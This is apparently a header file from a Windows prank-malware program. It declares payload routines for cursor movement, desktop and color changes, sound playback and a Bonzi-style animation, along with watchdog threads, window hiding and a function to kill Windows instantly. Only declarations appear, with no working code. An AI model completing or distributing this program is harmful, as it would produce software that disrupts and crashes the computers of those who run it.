// Enable XP styles
#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <magnification.h>

#include "data.h"
#include "payloads.h"

int random();
void strReverseW(LPWSTR str);

HANDLE open(LPWSTR path, LPWSTR args);
HANDLE open(LPWSTR path, LPWSTR args, LPWSTR dir);
LPWSTR rename(LPWSTR originalName, LPWSTR newName);

PAYLOADHOST(payloadHostDefault);

LRESULT CALLBACK WindowProcWatchdog(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WindowProcNoClose(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

void kill();
void killWindowsInstant();

DWORD WINAPI watchdogThread(LPVOID);

BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);

PAYLOADFUNCTIONDEFAULT(payloadExecute);
PAYLOADFUNCTIONDEFAULT(payloadMoveCursor);

PAYLOADHOST(payloadCrazyBus);
PAYLOADHOST(playSoundHost);

LRESULT CALLBACK messageBoxHookMove(int, WPARAM, LPARAM);

PAYLOADFUNCTIONDEFAULT(payloadJoelSounds);

PAYLOADHOST(payloadBonzi);
BOOL CALLBACK hideProc(HWND hwnd, LPARAM lParam);
BOOL CALLBACK hideProc2(HWND hwnd, LPARAM lParam);
LRESULT CALLBACK WindowProcBonzi(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
DWORD WINAPI bonziWatchdogThread(LPVOID parameter);

PAYLOADHOST(payloadAnimation);
DWORD WINAPI animationThread(LPVOID parameter);

PAYLOADHOST(payloadChangeCursor);
PAYLOADHOST(payloadChangeDesktop);
PAYLOADHOST(payloadTree);

PAYLOADHOST(payloadChangeColors);

DWORD WINAPI messageThread(LPVOID parameter);
LRESULT CALLBACK messageBoxHookButton(int, WPARAM, LPARAM);

MCIERROR playSound(LPWSTR alias, BOOL async);
MCIERROR playSound(LPWSTR alias, LPWSTR type, LPWSTR path, BOOL async);
MCIERROR playSound(LPWSTR alias, LPWSTR path, BOOL async);
MCIERROR openSound(LPWSTR path, LPWSTR alias, LPWSTR type);
MCIERROR stopSound(LPWSTR alias);

void memSet(VOID *ptr, char value, int count);
float sin(float x);

DWORD getParentProcess(DWORD pid);